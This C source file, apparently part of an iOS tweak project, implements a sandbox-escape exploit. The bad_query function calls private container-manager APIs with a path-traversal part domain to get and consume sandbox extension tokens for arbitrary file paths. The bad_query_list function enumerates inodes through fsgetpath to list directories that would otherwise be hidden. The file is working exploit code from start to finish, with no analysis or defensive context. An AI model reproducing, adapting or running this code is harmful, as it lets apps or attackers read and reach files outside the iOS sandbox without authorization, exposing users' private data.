#include "bad_query.h"
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <unistd.h>

// fsgetpath is exported by libsystem_kernel but is not declared by every
// Theos SDK. Keep the declaration local so the source remains portable.
extern ssize_t fsgetpath(
    char *buf,
    size_t bufsize,
    fsid_t *fsid,
    uint64_t inode
);

// The Theos SDK used by the build bot does not expose xpc/xpc.h.
typedef void *xpc_object_t;
typedef xpc_object_t (*bad_xpc_string_create_fn)(const char *);
typedef void (*bad_xpc_release_fn)(xpc_object_t);

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

#define BAD_QUERY_ERR(fmt, ...) fprintf(stderr, "[bad_query] " fmt "\n", ##__VA_ARGS__)

static xpc_object_t bad_xpc_string_create(const char *value) {
    void *xpc_handle = dlopen(
        "/usr/lib/system/libxpc.dylib",
        RTLD_NOW | RTLD_LOCAL
    );
    bad_xpc_string_create_fn create = (bad_xpc_string_create_fn)dlsym(
        xpc_handle ?: RTLD_DEFAULT,
        "xpc_string_create"
    );
    return create ? create(value) : NULL;
}

static void bad_xpc_release(xpc_object_t object) {
    if (!object) return;
    void *xpc_handle = dlopen(
        "/usr/lib/system/libxpc.dylib",
        RTLD_NOW | RTLD_LOCAL
    );
    bad_xpc_release_fn release = (bad_xpc_release_fn)dlsym(
        xpc_handle ?: RTLD_DEFAULT,
        "xpc_release"
    );
    if (release) release(object);
}

int64_t bad_query(char *path, bool create, char *group_identifier, bool is_group) {
    if (!path || path[0] != '/') return -255;
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) {
            BAD_QUERY_ERR("lstat failed path=%s errno=%d (%s)",
                          path, errno, strerror(errno));
            return -254;
        }
    }

    void *mgr = dlopen(
        "/usr/lib/system/libsystem_containermanager.dylib",
        RTLD_NOW | RTLD_LOCAL
    );
    if (!mgr) {
        BAD_QUERY_ERR("dlopen containermanager failed path=%s", path);
        return -1;
    }

    container_query_create_fn query_create =
        (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class =
        (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers =
        (container_query_set_identifiers_fn)dlsym(
            mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags =
        (container_query_set_flags_fn)dlsym(
            mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part =
        (container_query_set_part_fn)dlsym(
            mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain =
        (container_query_set_part_domain_fn)dlsym(
            mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result =
        (container_query_get_single_result_fn)dlsym(
            mgr, "container_query_get_single_result");
    container_query_free_fn query_free =
        (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token =
        (container_copy_sandbox_token_fn)dlsym(
            mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension =
        (sandbox_extension_consume_fn)dlsym(
            RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers ||
        !query_set_flags || !query_set_part || !query_set_part_domain ||
        !query_get_single_result || !query_free || !copy_sandbox_token ||
        !consume_extension) {
        BAD_QUERY_ERR("missing symbols for path=%s", path);
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -2;
    }

    xpc_object_t identifier;
    if (group_identifier == NULL) {
        query_set_class(query, 13);
        identifier = bad_xpc_string_create(
            "systemgroup.com.apple.mobilegestaltcache"
        );
    } else {
        query_set_class(query, 7);
        identifier = bad_xpc_string_create(group_identifier);
    }
    if (!identifier) {
        query_free(query);
        dlclose(mgr);
        return -2;
    }
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);

    char *part = NULL;
    const char *prefix = group_identifier == NULL
        ? "../../../../../../../.."
        : "../../../../../../../../..";
    if (asprintf(&part, "%s%s", prefix, path) == -1) {
        bad_xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -5;
    }
    query_set_part_domain(query, part);
    query_set_flags(query, is_group
        ? 0x0000000800000000ULL
        : 0x0000008000000000ULL);

    void *result = query_get_single_result(query);
    if (!result) {
        free(part);
        bad_xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -3;
    }

    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part);
        bad_xpc_release(identifier);
        query_free(query);
        dlclose(mgr);
        return -4;
    }

    int64_t handle = consume_extension(token);
    free(token);
    free(part);
    bad_xpc_release(identifier);
    query_free(query);
    dlclose(mgr);
    return handle;
}

void bad_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension =
        (sandbox_extension_release_fn)dlsym(
            RTLD_DEFAULT,
            "sandbox_extension_release"
        );
    if (release_extension) release_extension(handle);
}

char *bad_query_list(char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;

    size_t capacity = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);
    char *output = malloc(capacity);
    if (!output) return NULL;
    output[0] = '\0';

    char buffer[1200];
    for (uint64_t inode = 1; inode <= (uint64_t)max_inode; inode++) {
        ssize_t count = fsgetpath(buffer, sizeof(buffer), &fsid, inode);
        if (count <= 0) continue;

        const char *candidate = buffer;
        if (strncmp(candidate, "/private/var/", 13) == 0) candidate += 8;
        if (strncmp(candidate, path, path_length) != 0 ||
            candidate[path_length] != '/') {
            continue;
        }
        if (strchr(candidate + path_length + 1, '/')) continue;

        size_t required = strlen(candidate) + 2;
        while (length + required > capacity) {
            capacity *= 2;
            char *resized = realloc(output, capacity);
            if (!resized) {
                free(output);
                return NULL;
            }
            output = resized;
        }
        length += snprintf(output + length, capacity - length, "%s\n", candidate);
    }
    return output;
}